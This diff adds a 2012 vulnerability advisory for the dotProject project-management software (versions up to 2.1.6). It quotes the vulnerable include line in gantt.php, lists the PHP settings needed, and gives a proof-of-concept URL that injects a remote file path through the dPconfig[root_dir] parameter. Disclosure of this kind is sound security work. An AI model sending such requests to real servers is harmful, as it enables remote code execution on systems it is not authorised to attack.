@@ -1,0 +1,32 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ posdub[at]gmail.com ]
+   [ 2012-11-13                              ]
+ #################################################################
+ #  [ dotProject <= 2.1.6 ] Remote File Inclusion Vulnerability  #
+ #################################################################
+ #
+ # Script: "PHP web-based project management framework that includes modules for companies,
+ #          projects, tasks (with Gantt charts), forums, files, calendar, contacts, tickets/helpdesk,
+ #          multi-language support, user/module permissions and themes"
+ #
+ # Vendor:   http://www.dotproject.net/
+ # Download: http://sourceforge.net/projects/dotproject/files/dotproject/dotProject%20Version%202.1.6/
+ #
+ #################################################################
+ #
+ # [ Remote File Inclusion ] ( allow_url_include = On; register_globals = On; )
+ #
+ # File: dotproject/modules/projectdesigner/gantt.php ( line: 8 ):
+ # ..cut..
+ # include ($dPconfig['root_dir'].'/lib/jpgraph/src/jpgraph.php');
+ # ..cut..
+ #
+ # Vuln: http://localhost/dotproject/modules/projectdesigner/gantt.php?dPconfig[root_dir]=http://localhost/info.txt?
+ #
+ ### [ dun / 2012 ] #############################################
